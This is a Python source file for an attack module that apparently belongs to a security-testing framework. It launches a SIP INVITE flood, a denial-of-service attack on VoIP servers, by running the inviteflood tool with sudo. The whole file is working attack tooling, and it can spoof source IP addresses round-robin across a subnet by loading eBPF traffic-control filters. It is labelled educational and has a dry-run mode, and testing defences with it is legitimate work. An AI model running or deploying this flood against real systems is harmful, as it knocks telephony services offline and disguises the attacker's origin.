"""
eBPF-based InviteFlood Attack Module.

Implements SIP INVITE flood attacks using eBPF packet spoofing.
This module integrates eBPF traffic control filters for advanced packet manipulation.
"""

import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Any
from utils.attack.attack_enums import AttackProtocol, AttackType
from utils.core.logs import print_error, print_info, get_logger
from utils.interfaces.attack_interface import AttackInterface
from utils.registry.metadata import ModuleInfo


class EbpfInviteFloodAttack(AttackInterface):
    """
    eBPF-enhanced SIP INVITE Flood Attack Module.
    
    This module implements a SIP INVITE flood attack with advanced eBPF-based
    packet spoofing using Traffic Control (TC) filters.
    """
    
    # Module information for the registry
    infos: ModuleInfo = ModuleInfo(
        description="eBPF-enhanced SIP INVITE Flood Attack with advanced packet spoofing",
        version="1.0.0",
        author="Corentin COUSTY",
        requirements=["inviteflood", "clang", "tc", "bpftool"],
        license="Educational Use Only"
    )

    def __init__(self, 
                 target_ip: str = "127.0.0.1",
                 rate: int = 0,
                 delay: float = 0.0,
                 target_port: int = 5060,
                 interface: str = "eth0",
                 source_port: int = 0,
                 attack_queue_num: int = 1,
                 max_count: int = 0,
                 max_duration: int = 0,
                 user_agent: str = "StormShadow-eBPF",
                 spoofing_subnet: Optional[str] = None,
                 custom_payload_path: Optional[Path] = None,
                 sip_users: List[int] = [],
                 open_window: bool = False,
                 ebpf_source_port_filter: bool = True) -> None:
        """Initialize the eBPF-enhanced attack with parameters."""
 
        # Call the parent class constructor
        super().__init__(
            target_ip=target_ip,
            rate=rate,
            delay=delay,
            target_port=target_port,
            interface=interface,
            source_port=source_port,
            attack_queue_num=attack_queue_num,
            max_count=max_count,
            max_duration=max_duration,
            user_agent=user_agent,
            spoofing_subnet=spoofing_subnet,
            custom_payload_path=custom_payload_path,
            sip_users=sip_users,
            open_window=open_window
        )
        
        self.attack_type = AttackType.DDOS
        self.attack_protocol = AttackProtocol.SIP
        self.name = "EbpfInviteFloodAttack"
        self.dry_run_implemented = True
        self.resume_implemented = False
        self.spoofing_implemented = True
        
        # eBPF-specific settings
        self.ebpf_source_port_filter = ebpf_source_port_filter
        self.ebpf_active = False
        self.ebpf_dir = Path(__file__).parent
        
        # Spoofing method selection for minimal overhead
        self.spoofing_method = 'auto'  # Will be determined based on target IP
        
        # Validate spoofing subnet
        if spoofing_subnet and not self._validate_subnet(spoofing_subnet):
            print_error(f"Invalid spoofing subnet format: {spoofing_subnet}")
            self.spoofing_subnet = None
            
        # Validate target for eBPF spoofing
        if spoofing_subnet:
            self._validate_target_for_spoofing(target_ip)

        self.debug_parameters()
        print_info(f"eBPF InviteFlood attack initialized with target: {target_ip}:{target_port}")
        if self.spoofing_subnet:
            print_info(f"eBPF spoofing subnet: {self.spoofing_subnet}")

    def _validate_target_for_spoofing(self, target_ip: str) -> bool:
        """
        Validate target IP and select optimal spoofing method for minimal overhead.
        
        Automatically chooses:
        - TC filters for external IPs (maximum performance)
        - Netfilter hooks for local IPs (necessary for interception)
        """
        try:
            # Get local interface IPs
            local_ips = self._get_interface_ips()
            
            if target_ip in local_ips:
                print_info(f"Target IP {target_ip} is local interface IP")
                print_info("Auto-selecting netfilter method for local IP support")
                print_info("Benefits:")
                print_info("  • Works with local interface IPs")
                print_info("  • Minimal overhead (kernel-space only)")
                print_info("  • No userspace context switches")
                self.spoofing_method = 'netfilter'
                return True
            else:
                print_info(f"Target IP {target_ip} is external")
                print_info("Auto-selecting TC method for maximum performance")
                print_info("Benefits:")
                print_info("  • Zero-copy packet modification")
                print_info("  • Direct interface egress interception")
                print_info("  • Optimal for high-volume traffic")
                self.spoofing_method = 'tc'
                return True
                
        except Exception as e:
            from utils.core.logs import print_debug
            print_debug(f"Could not determine optimal method: {e}")
            print_info("Defaulting to TC method")
            self.spoofing_method = 'tc'
            return True
    
    def _get_interface_ips(self) -> set[str]:
        """Get all IP addresses assigned to the interface"""
        try:
            import subprocess
            result = subprocess.run(
                ['ip', 'addr', 'show', self.interface],
                capture_output=True, text=True, check=True
            )
            
            ips = set()
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    ip_part = line.split('inet ')[1].split('/')[0].strip()
                    ips.add(ip_part)
            
            return ips
            
        except Exception as e:
            from utils.core.logs import print_warning
            print_warning(f"Could not determine interface IPs: {e}")
            return set()

    def _validate_subnet(self, subnet: str) -> bool:
        """Validate CIDR subnet format."""
        import ipaddress
        try:
            ipaddress.ip_network(subnet, strict=False)
            return True
        except ValueError:
            return False

    def _get_current_verbosity(self) -> str:
        """Get the current logging verbosity level."""
        logger = get_logger()
        level = logger.level
        level_map = {
            10: "debug",
            15: "dev", 
            20: "info",
            25: "success",
            30: "warning",
            40: "error",
            50: "critical"
        }
        return level_map.get(level, "info")

    def cleanup(self) -> None:
        """Clean up eBPF resources."""
        print_info("Cleaning up eBPF InviteFlood attack resources")
        if self.ebpf_active:
            self.stop_spoofing()

    def end(self):
        """End the attack and cleanup."""
        print_info("Ending the eBPF InviteFlood attack")
        self.cleanup()

    def run(self) -> None:
        """Execute the eBPF-enhanced InviteFlood attack."""
        print_info("Running eBPF InviteFlood attack")
        
        if self.dry_run:
            print_info("Dry run mode: would execute eBPF inviteflood attack")
            print_info(f"Would attack target: {self.target_ip}:{self.target_port}")
            if self.spoofing_subnet:
                print_info(f"Would spoof packets from subnet: {self.spoofing_subnet}")
            return
            
        # Start eBPF spoofing if configured
        if self.spoofing_subnet and not self.start_spoofing():
            print_error("Failed to start eBPF spoofing, aborting attack")
            return
            
        try:
            # Build the inviteflood command
            # When using eBPF spoofing, let inviteflood use the interface's default IP
            # The eBPF program will modify packets on egress
            command = [
                "inviteflood",
                self.interface,
                "200",  # target user (empty string for all)
                self.target_ip,  # target domain (using IP)
                self.target_ip,  # IPv4 addr of flood target
                str(self.max_count),  # flood stage (number of packets)
            ]
            
            # Add optional parameters
            if self.source_port > 0:
                command.extend(["-S", str(self.source_port)])
            if self.target_port != 5060:  # Only specify if not default SIP port
                command.extend(["-D", str(self.target_port)])
                
            print_info(f"Executing: {' '.join(command)}")
            
            # Run inviteflood with sudo (required for raw sockets)
            result = subprocess.run(
                ["sudo"] + command,
                capture_output=True,
                text=True,
                check=False
            )
            
            if result.returncode == 0:
                print_info("InviteFlood attack completed successfully")
                print_info(result.stdout)
            else:
                print_error(f"InviteFlood attack failed: {result.stderr}")
                
        except Exception as e:
            print_error(f"Failed to run eBPF InviteFlood attack: {e}")
        finally:
            # Always cleanup eBPF spoofing
            if self.ebpf_active:
                self.stop_spoofing()

    def stop(self) -> None:
        """Stop the attack."""
        print_info("Stopping eBPF InviteFlood attack")
        self.end()

    def get_attack_description(self) -> str:
        """Return attack description."""
        return (
            "eBPF-enhanced SIP INVITE Flood Attack Module. "
            "Uses advanced eBPF Traffic Control filters for packet spoofing, "
            "enabling sophisticated source IP and port manipulation. "
            "Supports round-robin IP spoofing across configurable subnets."
        )

    def start_spoofing(self) -> bool:
        """
        Start eBPF spoofing using Traffic Control filters.
        
        Returns:
            bool: True if spoofing is successfully set up, False otherwise.
        """
        print_info("Setting up eBPF Traffic Control spoofing")
        
        if not self.spoofing_subnet:
            print_error("No spoofing subnet configured")
            return False
            
        if self.ebpf_active:
            print_info("eBPF spoofing already active")
            return True
            
        try:
            # Check if required tools are available
            required_tools = ["clang", "tc", "bpftool"]
            for tool in required_tools:
                result = subprocess.run(["which", tool], capture_output=True)
                if result.returncode != 0:
                    print_error(f"Required tool not found: {tool}")
                    return False
            
            # Setup eBPF spoofing using the load script
            load_script = self.ebpf_dir / "load_tc_spoofer.sh"
            if not load_script.exists():
                print_error(f"eBPF load script not found: {load_script}")
                return False
                
            # Prepare command arguments
            cmd = [
                str(load_script),
                self.interface,
                self.target_ip,
                str(self.target_port),
                self.spoofing_subnet,
                str(self.source_port) if self.ebpf_source_port_filter and self.source_port > 0 else "0"
            ]
            
            print_info(f"Executing eBPF setup: {' '.join(cmd)}")
            
            # Run the eBPF setup
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=self.ebpf_dir,
                check=False
            )
            
            if result.returncode != 0:
                print_error(f"Failed to setup eBPF spoofing: {result.stderr}")
                print_error(f"Command output: {result.stdout}")
                return False
                
            self.ebpf_active = True
            print_info("eBPF spoofing started successfully")
            print_info(f"eBPF output: {result.stdout}")
            return True
            
        except Exception as e:
            print_error(f"Exception while setting up eBPF spoofing: {e}")
            return False

    def stop_spoofing(self) -> bool:
        """
        Stop eBPF spoofing by removing Traffic Control filters.
        
        Returns:
            bool: True if spoofing is successfully stopped, False otherwise.
        """
        print_info("Stopping eBPF Traffic Control spoofing")
        
        if not self.ebpf_active:
            print_info("eBPF spoofing not active")
            return True
            
        try:
            # Use the unload script to clean up eBPF filters
            unload_script = self.ebpf_dir / "unload_tc_spoofer.sh"
            if not unload_script.exists():
                print_error(f"eBPF unload script not found: {unload_script}")
                return False
                
            cmd = [str(unload_script), self.interface]
            
            print_info(f"Executing eBPF cleanup: {' '.join(cmd)}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=self.ebpf_dir,
                check=False
            )
            
            if result.returncode != 0:
                print_error(f"Failed to stop eBPF spoofing: {result.stderr}")
                print_error(f"Command output: {result.stdout}")
                return False
                
            self.ebpf_active = False
            print_info("eBPF spoofing stopped successfully")
            print_info(f"eBPF cleanup output: {result.stdout}")
            return True
            
        except Exception as e:
            print_error(f"Exception while stopping eBPF spoofing: {e}")
            return False

    def get_ebpf_status(self) -> Dict[str, Any]:
        """
        Get the current status of eBPF spoofing.
        
        Returns:
            Dict[str, Any]: Status information about the eBPF spoofing setup.
        """
        status: Dict[str, Any] = {
            "active": self.ebpf_active,
            "interface": self.interface,
            "target": f"{self.target_ip}:{self.target_port}",
            "spoofing_subnet": self.spoofing_subnet,
            "source_port_filter": self.source_port if self.ebpf_source_port_filter else "any"
        }
        
        if self.ebpf_active:
            try:
                # Check TC filters
                result = subprocess.run(
                    ["tc", "filter", "show", "dev", self.interface, "egress"],
                    capture_output=True,
                    text=True,
                    check=False
                )
                status["tc_filters"] = result.stdout if result.returncode == 0 else "Error getting filters"
                
                # Check eBPF maps
                maps_result = subprocess.run(
                    ["sudo", "bpftool", "map", "show", "pinned", "/sys/fs/bpf/tc/globals/spoof_cfg"],
                    capture_output=True,
                    text=True,
                    check=False
                )
                status["ebpf_maps"] = maps_result.stdout if maps_result.returncode == 0 else "Error getting maps"
                
            except Exception as e:
                status["error"] = str(e)
                
        return status
